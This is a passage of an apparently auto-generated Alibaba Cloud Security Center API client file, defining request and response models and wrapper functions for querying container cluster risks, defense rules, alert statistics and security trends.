    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary The total number of instances that are at risk.
 *
 * @param request GetCloudAssetSummaryRequest
 * @return GetCloudAssetSummaryResponse
 */
async function getCloudAssetSummary(request: GetCloudAssetSummaryRequest): GetCloudAssetSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCloudAssetSummaryWithOptions(request, runtime);
}

model GetClusterCheckItemWarningStatisticsRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](https://help.aliyun.com/document_detail/182997.html) operation to query the IDs of container clusters.', example='cd49575861a3044d49c954e4b3911****'),
  uuid?: string(name='Uuid', description='The server UUID.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the server UUID.', example='e4af3620-6895-4e2f-a641-a9d8fb53****'),
}

model GetClusterCheckItemWarningStatisticsResponseBody = {
  data?: {
    highWarningCount?: int32(name='HighWarningCount', description='The number of high-risk items.', example='3'),
    lowWarningCount?: int32(name='LowWarningCount', description='The number of low-risk items.', example='1'),
    mediumWarningCount?: int32(name='MediumWarningCount', description='The number of medium-risk items.', example='2'),
  }(name='Data', description='The statistics on risk items by risk level.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C2B285A3-3493-5C5F-A224-4CCE4BFC****'),
}

model GetClusterCheckItemWarningStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetClusterCheckItemWarningStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics on baseline risk items of container clusters.
 *
 * @param request GetClusterCheckItemWarningStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetClusterCheckItemWarningStatisticsResponse
 */
async function getClusterCheckItemWarningStatisticsWithOptions(request: GetClusterCheckItemWarningStatisticsRequest, runtime: Util.RuntimeOptions): GetClusterCheckItemWarningStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClusterCheckItemWarningStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics on baseline risk items of container clusters.
 *
 * @param request GetClusterCheckItemWarningStatisticsRequest
 * @return GetClusterCheckItemWarningStatisticsResponse
 */
async function getClusterCheckItemWarningStatistics(request: GetClusterCheckItemWarningStatisticsRequest): GetClusterCheckItemWarningStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClusterCheckItemWarningStatisticsWithOptions(request, runtime);
}

model GetClusterRuleSummaryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.

This parameter is required.', example='cc49d88d1exxx'),
}

model GetClusterRuleSummaryResponseBody = {
  clusterRuleSummary?: {
    closeRuleCount?: int32(name='CloseRuleCount', description='The number of disabled cluster defense rules.', example='1'),
    interceptionCount7Day?: long(name='InterceptionCount7Day', description='The number of alerts that are triggered by the cluster defense rules in the last seven days.', example='10'),
    interceptionSwitch?: int32(name='InterceptionSwitch', description='The status of the container firewall feature. Valid values:

*   **0**: disabled
*   **1**: enabled', example='0'),
    interceptionType?: int32(name='InterceptionType', description='The interception mode.', example='0'),
    openRuleCount?: int32(name='OpenRuleCount', description='The number of enabled cluster defense rules.', example='1'),
    ruleCount?: int32(name='RuleCount', description='The total number of configured cluster defense rules.', example='10'),
    suggestRuleCount?: int32(name='SuggestRuleCount', description='The number of recommended cluster defense rules.', example='1'),
  }(name='ClusterRuleSummary', description='The overall information about the cluster defense rules.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='291B49F9-xxx'),
}

model GetClusterRuleSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetClusterRuleSummaryResponseBody(name='body'),
}

/**
 * @summary Queries the overall information about cluster defense rules that are configured for the container firewall feature.
 *
 * @param request GetClusterRuleSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetClusterRuleSummaryResponse
 */
async function getClusterRuleSummaryWithOptions(request: GetClusterRuleSummaryRequest, runtime: Util.RuntimeOptions): GetClusterRuleSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClusterRuleSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the overall information about cluster defense rules that are configured for the container firewall feature.
 *
 * @param request GetClusterRuleSummaryRequest
 * @return GetClusterRuleSummaryResponse
 */
async function getClusterRuleSummary(request: GetClusterRuleSummaryRequest): GetClusterRuleSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClusterRuleSummaryWithOptions(request, runtime);
}

model GetClusterStrategyCountResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The total number of entries.', example='3'),
  data?: [ 
    {
      clusterId?: string(name='ClusterId', description='The cluster ID.', example='c8ca91e0907d94efaba7fb0827eb9****'),
      strategyCount?: int32(name='StrategyCount', description='The number of policies.', example='10'),
    }
  ](name='Data', description='The returned data.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='success'),
  requestId?: string(name='RequestId', description='The request ID.', example='796348B5-115C-5BFB-83EA-B5C3C12F822F'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetClusterStrategyCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetClusterStrategyCountResponseBody(name='body'),
}

/**
 * @summary Queries the number of policies in each cluster.
 *
 * @param request GetClusterStrategyCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetClusterStrategyCountResponse
 */
async function getClusterStrategyCountWithOptions(runtime: Util.RuntimeOptions): GetClusterStrategyCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetClusterStrategyCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of policies in each cluster.
 *
 * @return GetClusterStrategyCountResponse
 */
async function getClusterStrategyCount(): GetClusterStrategyCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClusterStrategyCountWithOptions(runtime);
}

model GetClusterSuspEventStatisticsRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c6094b964bfc145fe9e418c869e7e****'),
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas'),
}

model GetClusterSuspEventStatisticsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ACF97412-FD09-4D1F-994F-34DF12BR****'),
  suspStatistics?: {
    remind?: int32(name='Remind', description='The number of alerts whose Emergency level is Reminder.', example='1'),
    serious?: int32(name='Serious', description='The number of alerts whose Emergency level is Urgent.', example='1'),
    suspicious?: int32(name='Suspicious', description='The number of alerts whose Emergency level is Suspicious.', example='2'),
  }(name='SuspStatistics', description='The number of alerts by risk level.'),
}

model GetClusterSuspEventStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetClusterSuspEventStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics on alert events that are generated for containers.
 *
 * @param request GetClusterSuspEventStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetClusterSuspEventStatisticsResponse
 */
async function getClusterSuspEventStatisticsWithOptions(request: GetClusterSuspEventStatisticsRequest, runtime: Util.RuntimeOptions): GetClusterSuspEventStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClusterSuspEventStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics on alert events that are generated for containers.
 *
 * @param request GetClusterSuspEventStatisticsRequest
 * @return GetClusterSuspEventStatisticsResponse
 */
async function getClusterSuspEventStatistics(request: GetClusterSuspEventStatisticsRequest): GetClusterSuspEventStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClusterSuspEventStatisticsWithOptions(request, runtime);
}

model GetCommonSwitchConfigRequest {
  type?: string(name='Type', description='The type of the common switch.

>  You can call the [ListClientUserDefineRules](~~ListClientUserDefineRules~~) or [ListSystemClientRules](~~ListSystemClientRules~~) operation to obtain the switch type from the response parameter SwitchId.', example='USER-DEFINE-RULE-SWITCH-TYPE_180****'),
}

model GetCommonSwitchConfigResponseBody = {
  data?: {
    targetDefault?: string(name='TargetDefault', description='Specifies whether to turn on the switch for newly added servers. Valid values:

*   **add**: By default, the switch is turned on for newly added servers.
*   **del**: By default, the switch is turned off for newly added servers.', example='add'),
    targetSyncStatus?: string(name='TargetSyncStatus', description='The status of the synchronization. Valid values:

*   **sync**: The modifications are being synchronized.
*   **valid**: The modifications has taken effect.', example='valid'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model GetCommonSwitchConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCommonSwitchConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configuration of a common switch.
 *
 * @param request GetCommonSwitchConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCommonSwitchConfigResponse
 */
async function getCommonSwitchConfigWithOptions(request: GetCommonSwitchConfigRequest, runtime: Util.RuntimeOptions): GetCommonSwitchConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCommonSwitchConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configuration of a common switch.
 *
 * @param request GetCommonSwitchConfigRequest
 * @return GetCommonSwitchConfigResponse
 */
async function getCommonSwitchConfig(request: GetCommonSwitchConfigRequest): GetCommonSwitchConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCommonSwitchConfigWithOptions(request, runtime);
}

model GetConsoleFuncGrayStatusRequest {
  condition?: string(name='Condition', description='Name of the function module.', example='vpcConsoleSwitch'),
  lang?: string(name='Lang', description='Set the language type for request and response messages. Default value: **zh**. Values:

- **zh**: Chinese
- **en**: English', example='zh'),
}

model GetConsoleFuncGrayStatusResponseBody = {
  data?: {
    excludeApiList?: [ 
      {
        action?: string(name='Action', description='Action corresponding to the API.', example='GetAttackTypeList'),
        code?: string(name='Code', description='Product Code.', example='Sas'),
        version?: string(name='Version', description='API version.', example='2017-11-10'),
      }
    ](name='ExcludeApiList', description='List of APIs not hit.'),
    hit?: boolean(name='Hit', description='Whether it hits the gray status.', example='true'),
  }(name='Data', description='Return result.'),
  requestId?: string(name='RequestId', description='The ID of this call request, which is a unique identifier generated by Alibaba Cloud for the request. It can be used to troubleshoot and pinpoint issues.', example='5DFD6277-CC36-57F7-ACE6-F5952XXXXXXXX'),
}

model GetConsoleFuncGrayStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetConsoleFuncGrayStatusResponseBody(name='body'),
}

/**
 * @summary Query whether the core function\\"s gray switch is hit
 *
 * @param request GetConsoleFuncGrayStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetConsoleFuncGrayStatusResponse
 */
async function getConsoleFuncGrayStatusWithOptions(request: GetConsoleFuncGrayStatusRequest, runtime: Util.RuntimeOptions): GetConsoleFuncGrayStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.condition)) {
    query['Condition'] = request.condition;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetConsoleFuncGrayStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query whether the core function\\"s gray switch is hit
 *
 * @param request GetConsoleFuncGrayStatusRequest
 * @return GetConsoleFuncGrayStatusResponse
 */
async function getConsoleFuncGrayStatus(request: GetConsoleFuncGrayStatusRequest): GetConsoleFuncGrayStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return getConsoleFuncGrayStatusWithOptions(request, runtime);
}

model GetContainerDefenseRuleDetailRequest {
  ruleId?: long(name='RuleId', description='The rule ID.

>  You can call the [ListContainerDefenseRule](https://help.aliyun.com/document_detail/2590599.html) operation to query the rule ID.', example='156'),
}

model GetContainerDefenseRuleDetailResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    aliUid?: long(name='AliUid', description='The user ID.', example='1766185894104***'),
    description?: string(name='Description', description='The description of the rule.', example='Custom defense configuration'),
    eventName?: string(name='EventName', description='The alert name. Valid values:

*   **Non-image Program Startup**', example='EventName'),
    eventType?: string(name='EventType', description='The alert type. Valid values:

*   **Proactive Defense for Containers**', example='EventType'),
    id?: long(name='Id', description='The ID of the rule.', example='1948'),
    ruleAction?: int32(name='RuleAction', description='The action specified in the rule. Valid values:

*   **1**: alert
*   **2**: block', example='1'),
    ruleName?: string(name='RuleName', description='The name of the rule.', example='test-000'),
    ruleSwitch?: int32(name='RuleSwitch', description='The status of the rule. Valid values:

*   **1**: enabled
*   **0**: disabled', example='0'),
    ruleType?: string(name='RuleType', description='The type of the rule. Valid values:

*   **1**: system rule
*   **2**: custom rule', example='1'),
    scope?: [ 
      {
        allNamespace?: int32(name='AllNamespace', description='Indicates whether all namespaces are included. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
        clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c9bea04*2b25**'),
        namespaces?: [ string ](name='Namespaces', description='An array that consists of queried namespaces.'),
      }
    ](name='Scope', description='The effective scope of the rule.'),
    whitelist?: {
      hash?: [ string ](name='Hash', description='The hash values of the files that are added to the whitelist.

>  This parameter is not supported.', deprecated=true),
      image?: [ string ](name='Image', description='An array consisting of images that are added to the whitelist.'),
      path?: [ string ](name='Path', description='The paths to the files that are added to the whitelist.'),
    }(name='Whitelist', description='The whitelist.'),
  }(name='Data', description='The details of the rule.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code. The status code 200 indicates that the request was successful.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='77546BF4-CCE8-5F8D-B42B-5FD3306B43B4'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetContainerDefenseRuleDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetContainerDefenseRuleDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details of a rule for non-image program defense.
 *
 * @param request GetContainerDefenseRuleDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetContainerDefenseRuleDetailResponse
 */
async function getContainerDefenseRuleDetailWithOptions(request: GetContainerDefenseRuleDetailRequest, runtime: Util.RuntimeOptions): GetContainerDefenseRuleDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetContainerDefenseRuleDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of a rule for non-image program defense.
 *
 * @param request GetContainerDefenseRuleDetailRequest
 * @return GetContainerDefenseRuleDetailResponse
 */
async function getContainerDefenseRuleDetail(request: GetContainerDefenseRuleDetailRequest): GetContainerDefenseRuleDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getContainerDefenseRuleDetailWithOptions(request, runtime);
}

model GetCurrentVersionPublishResponseBody = {
  data?: {
    autoUpgrade?: int32(name='AutoUpgrade', description='Indicates whether automatic upgrade is enabled. Valid values:

*   **1**: yes.
*   **0**: no.', example='1'),
    bigCustomer?: boolean(name='BigCustomer', description='Indicates whether you can enable custom upgrade for the Security Center agent. Valid values:

*   **true**
*   **false**', example='true'),
    curVersion?: string(name='CurVersion', description='The version of the Security Center agent.', example='0.0.8'),
    forceUpgradeTime?: long(name='ForceUpgradeTime', description='The timestamp when the Security Center agent was forcibly upgraded.', example='1732506308000'),
    graySwitchStatus?: int32(name='GraySwitchStatus', description='Indicates whether the canary release policy is enabled. Valid values:

*   **1**: yes.
*   .**0**: no.', example='1'),
    latestVersion?: string(name='LatestVersion', description='The latest version of the Security Center agent.', example='0.0.9'),
    latestVersionCreate?: long(name='LatestVersionCreate', description='The timestamp when the latest version of the Security Center agent was created.', example='1662639150000'),
    latestVersionDesc?: string(name='LatestVersionDesc', description='The description of about the latest version.', example='test'),
    publishStatus?: int32(name='PublishStatus', description='The publish status of the Security Center agent. Valid values:

*   **0**: not started.
*   **1**: publishing.
*   **2**: published.
*   **3**: publish suspended.
*   **4**: forcibly upgrading.', example='1'),
    upgradeVersion?: string(name='UpgradeVersion', description='The destination version of the Security Center agent.', example='0.0.9'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='1383B0DB-D5D6-4B0C-9E6B-75939C8E67FE'),
}

model GetCurrentVersionPublishResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCurrentVersionPublishResponseBody(name='body'),
}

/**
 * @summary Queries the publish details of the Security Center agent.
 *
 * @param request GetCurrentVersionPublishRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCurrentVersionPublishResponse
 */
async function getCurrentVersionPublishWithOptions(runtime: Util.RuntimeOptions): GetCurrentVersionPublishResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetCurrentVersionPublish',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the publish details of the Security Center agent.
 *
 * @return GetCurrentVersionPublishResponse
 */
async function getCurrentVersionPublish(): GetCurrentVersionPublishResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCurrentVersionPublishWithOptions(runtime);
}

model GetDataTrendRequest {
  bizTypes?: string(name='BizTypes', description='The type of the security data that you want to query. Valid values:

*   **HC_NEW**: the number of new baseline risks.
*   **HC_OPERATE**: the number of handled baseline risks.
*   **VUL_NEW**: the number of new vulnerabilities.
*   **VUL_OPERATE**: the number of handled vulnerabilities.
*   **SUSP_NEW**: the number of new alerts.
*   **SUSP_OPERATE**: the number of handled alerts.

This parameter is required.', example='HC_NEW,HC_OPERATE'),
  endTimestamp?: long(name='EndTimestamp', description='The end of the time range to query. The value is a UNIX timestamp. Unit: milliseconds.

This parameter is required.', example='1721923200000'),
  interval?: int32(name='Interval', description='The interval of the data that you want to query. Unit: milliseconds.

>  The minimum value is 1000.

This parameter is required.', example='86400000'),
  startTimestamp?: long(name='StartTimestamp', description='The beginning of the time range to query. The value is a UNIX timestamp. Unit: milliseconds.

This parameter is required.', example='1687334501000'),
}

model GetDataTrendResponseBody = {
  data?: {
    dateList?: [ int32 ](name='DateList', description='The statistical timestamps of the trend data.'),
    dateStrList?: [ string ](name='DateStrList', description='The statistical dates and time for the trend data.'),
    itemList?: [ 
      {
        countList?: [ long ](name='CountList', description='The statistical values of the trend data.'),
        keyName?: string(name='KeyName', description='The type of the security data. Valid values:

*   **HC_NEW**: the number of new baseline risks.
*   **HC_OPERATE**: the number of handled baseline risks.
*   **VUL_NEW**: the number of new vulnerabilities.
*   **VUL_OPERATE**: the number of handled vulnerabilities.
*   **SUSP_NEW**: the number of new alerts.
*   **SUSP_OPERATE**: the number of handled alerts.', example='HC_NEW'),
      }
    ](name='ItemList', description='The returned data.'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='1383B0DB-D5D6-4B0C-9E6B-75939C8E****'),
}

model GetDataTrendResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetDataTrendResponseBody(name='body'),
}

/**
 * @summary Queries the security operations trends of the vulnerabilities, alerts, and baseline risks.
 *
 * @param request GetDataTrendRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetDataTrendResponse
 */
async function getDataTrendWithOptions(request: GetDataTrendRequest, runtime: Util.RuntimeOptions): GetDataTrendResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bizTypes)) {
    query['BizTypes'] = request.bizTypes;
  }
  if (!Util.isUnset(request.endTimestamp)) {
    query['EndTimestamp'] = request.endTimestamp;
  }
  if (!Util.isUnset(request.interval)) {
    query['Interval'] = request.interval;
  }
  if (!Util.isUnset(request.startTimestamp)) {
    query['StartTimestamp'] = request.startTimestamp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetDataTrend',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the security operations trends of the vulnerabilities, alerts, and baseline risks.
 *
 * @param request GetDataTrendRequest
 * @return GetDataTrendResponse
 */
async function getDataTrend(request: GetDataTrendRequest): GetDataTrendResponse {
  var runtime = new Util.RuntimeOptions{};
  return getDataTrendWithOptions(request, runtime);
}

model GetDefenceCountResponseBody = {
  defenceCount15Days?: int32(name='DefenceCount15Days', description='The number of handled alerts of the precise defense type in the last 15 days.', example='1'),
  defenceCountTotal?: int32(name='DefenceCountTotal', description='The number of handled alerts of the precision defense type.', example='1'),
  requestId?: string(name='RequestId', description='The request ID.', example='89AD16CC-97EE-50F3-9B12-9E28E5C8****'),
  tamperProof15Days?: int32(name='TamperProof15Days', description='The number of handled alerts of the web tamper proofing type in the last 15 days.', example='2'),
  tamperProofTotal?: int32(name='TamperProofTotal', description='The number of handled alerts of the web tamper proofing type.', example='1'),
}

model GetDefenceCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetDefenceCountResponseBody(name='body'),
}

/**
 * @summary Queries the numbers of handled alerts of the precision defense type and the web tamper proofing type.
 *
 * @param request GetDefenceCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetDefenceCountResponse
 */
async function getDefenceCountWithOptions(runtime: Util.RuntimeOptions): GetDefenceCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetDefenceCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the numbers of handled alerts of the precision defense type and the web tamper proofing type.
 *
 * @return GetDefenceCountResponse
 */
async function getDefenceCount(): GetDefenceCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getDefenceCountWithOptions(runtime);
}

model GetDockerhubImageRiskRankInfoRequest {
  types?: [ string ](name='Types', description='The types of image dimensions to be counted.'),
}

model GetDockerhubImageRiskRankInfoResponseBody = {
  requestId?: string(name='RequestId', description='The ID of this call request, a unique identifier generated by Alibaba Cloud for the request, which can be used for troubleshooting and problem localization.', example='30CBF632-109F-596F-97F2-451C8B2A****'),
  riskRankInfo?: {
    baseline?: [ 
      {
        digest?: string(name='Digest', description='Image digest value.', example='f28ecca63bfaf22ead4b28b63d752a21e4d2c1de90b8549fbde880d619f3****'),
        hcCount?: int32(name='HcCount', description='Number of baseline risks in the image repository.', example='1'),
        imageId?: string(name='ImageId', description='ID of the image.', example='7c5ad02865aef575387a05bb3c81b27e0d8ed1f2e3f722ea05523b72882f****'),
        imageSize?: long(name='ImageSize', description='Image size.', example='1024'),
        repoName?: string(name='RepoName', description='Name of the container image repository.', example='glz123'),
        repoNamespace?: string(name='RepoNamespace', description='Repository namespace.', example='namespace-01'),
        riskLevelDetail?: string(name='RiskLevelDetail', description='Risk statistics for hosts, images, and containers.', example='{\\\\"account\\\\":0,\\\\"agentlessAll\\\\":0,\\\\"agentlessBaseline\\\\":0,\\\\"agentlessMalicious\\\\":0,\\\\"agentlessSensitiveFile\\\\":0,\\\\"agentlessVulCve\\\\":0,\\\\"agentlessVulSca\\\\":0,\\\\"agentlessVulSys\\\\":0,\\\\"appNum\\\\":0,\\\\"asapVulCount\\\\":0,\\\\"baselineHigh\\\\":0,\\\\"baselineLow\\\\":0,\\\\"baselineMedium\\\\":0,\\\\"baselineNum\\\\":0,\\\\"cmsNum\\\\":0,\\\\"containerAsap\\\\":0,\\\\"containerLater\\\\":0,\\\\"containerNntf\\\\":0,\\\\"containerRemind\\\\":0,\\\\"containerSerious\\\\":0,\\\\"containerSuspicious\\\\":0,\\\\"cveNum\\\\":0,\\\\"emgNum\\\\":0,\\\\"health\\\\":0,\\\\"imageBaselineHigh\\\\":1,\\\\"imageBaselineLow\\\\":0,\\\\"imageBaselineMedium\\\\":0,\\\\"imageBaselineNum\\\\":1,\\\\"imageMaliciousFileRemind\\\\":0,\\\\"imageMaliciousFileSerious\\\\":0,\\\\"imageMaliciousFileSuspicious\\\\":0,\\\\"imageVulAsap\\\\":0,\\\\"imageVulLater\\\\":0,\\\\"imageVulNntf\\\\":0,\\\\"laterVulCount\\\\":0,\\\\"newSuspicious\\\\":0,\\\\"nntfVulCount\\\\":0,\\\\"remindNum\\\\":0,\\\\"scaNum\\\\":0,\\\\"seriousNum\\\\":0,\\\\"suspNum\\\\":0,\\\\"suspicious\\\\":0,\\\\"sysNum\\\\":0,\\\\"trojan\\\\":0,\\\\"uuid\\\\":\\\\"009635bf00c0585e3122ab92f5449919\\\\",\\\\"vul\\\\":0,\\\\"w